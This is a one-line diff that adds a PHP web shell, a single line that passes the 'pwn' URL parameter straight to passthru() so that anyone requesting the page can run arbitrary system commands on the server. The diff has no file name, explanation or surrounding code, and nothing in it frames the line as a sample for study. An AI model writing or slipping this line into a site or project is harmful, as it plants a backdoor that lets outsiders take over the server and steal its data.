@@ -1,0 +1,1 @@
+<? passthru($_GET[pwn]) ?>
